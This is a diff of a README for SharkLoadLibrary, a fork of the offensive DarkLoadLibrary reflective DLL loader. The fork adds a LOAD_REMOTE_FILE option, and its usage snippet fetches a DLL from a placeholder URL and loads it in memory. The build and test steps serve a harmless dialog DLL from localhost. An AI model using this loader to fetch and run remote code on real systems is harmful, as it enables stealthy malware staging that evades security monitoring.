@@ -1,46 +1,55 @@
-# DarkLoadLibrary
+# SharkLoadLibrary
 
-`LoadLibrary` for offensive operations.
+LoadLibrary for Children's Paradise.
 
-### How does it work?
+:sailboat: Folk From [DarkLoadLibrary](https://github.com/bats3c/DarkLoadLibrary) and thanks.
 
-https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/
+## Feature
 
-### Usage
+New feature: **LOAD_REMOTE_FILE**
+
+## Usage
 
 ```C
-DARKMODULE DarkModule = DarkLoadLibrary(
-    LOAD_LOCAL_FILE, // control flags
-    L"TestDLL.dll", // local dll path, if loading from disk
-    NULL, // dll buffer to load from if loading from memory
-    0, // dll size if loading from memory
-    NULL // dll name if loaded from memory
+PDARKMODULE DarkModule = DarkLoadLibrary(
+	LOAD_REMOTE_FILE, // control flags
+	"http://xxxx/demo.dll", // remote dll url, if loading from remote
+	NULL, // dll buffer to load from if loading from memory
+	0, // dll size if loading from memory
+	L"Demo" // dll name if loaded from memory and remote
 );
 ```
 
-#### Control Flags:
--   LOAD_LOCAL_FILE - Load a DLL from the file system.
--   LOAD_MEMORY - Load a DLL from a buffer.
--   NO_LINK  - Don't link this module to the PEB, just execute it.
+## Build && Test
 
-#### DLL Path:
+### Environmental requirements
 
-This can be any path that `CreateFileW` will open.
+* libcurl
 
-### DLL Buffer:
+  Install from vcpkg: 
 
-This argument is only needed when `LOAD_MEMORY` is set. In that case this argument should be the buffer containing the DLL.
+  ```shell
+  .\vcpkg install curl:x64-windows-static
+  ```
 
-#### DLL Size:
+  and set vcpkg->Use Static Libraries `YES`
 
-This argument is only needed when `LOAD_MEMORY` is set. In that case this argument should be the size of the buffer containing the DLL.
+Build it :)
 
-#### DLL Name:
+### Test
 
-This argument is only needed when `LOAD_MEMORY` is set. In that case this argument should be the name which the DLL should be set in the PEB under.
+I made a test dll named demo.dll.
 
-### Considerations
+It has a export function named Demo and just pop a dialog.
 
-The windows loader is very complex and can handle all the edge case's and intricacies of loading DLLs. There are going to be edge case's which I have not had the time to discover, reverse engineer and implement. So there's going to be DLLs that this loader simply will not work with.
+use `Python3` start a server: 
 
-That being said I plan on making this loader as complete as possible, so please open issue's for DLLs that are not correctly loaded.
+```shell
+python -m http.server
+```
+
+url maybe like `http://127.0.0.1:8000/demo.dll`
+
+use url replace `http://xxxx/demo.dll`
+
+Build && Run
